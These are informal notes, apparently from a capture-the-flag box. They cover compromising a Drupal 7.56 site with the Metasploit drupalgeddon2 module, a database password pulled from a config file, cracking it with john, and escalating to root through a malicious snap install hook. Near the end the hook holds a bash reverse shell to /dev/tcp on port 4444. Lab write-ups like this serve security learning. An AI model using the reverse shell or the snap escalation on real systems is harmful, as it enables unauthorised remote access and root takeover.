I'm drunk so these notes are a disaster. 

nmap finds webpages that have install.txt

install.txt tells me it's drupal

/modules/user/user.info says it's 7.56 so drupalgeddon3? Need to be authenticated. 

So the meterpreter version works (unix/webapp/drupal_drupalgeddon2) not sure why the other one doesn't? 

* [ ] Watch the writeup that doesn't use mterpreter. 

Got shell. Find this in one file. 

~~~
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);

~~~

Can't connect to dB for some readon. Tried to portfwd with meterp and still getting error. Couldn't connect to the db locally either. 

Sometimes mysql works and other times not? Kindof annoying. Anyway, got the creds and john cracks it. 

Can ssh in. 

Can run snap as root. 

GTFObins thing was kinda weird but I just found the answer online since i knew what i was looking for =/

This is what ended up working to get root. 

~~~
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/<ip>/4444 0>&1"\n' > ./meta/hooks/install
~~~

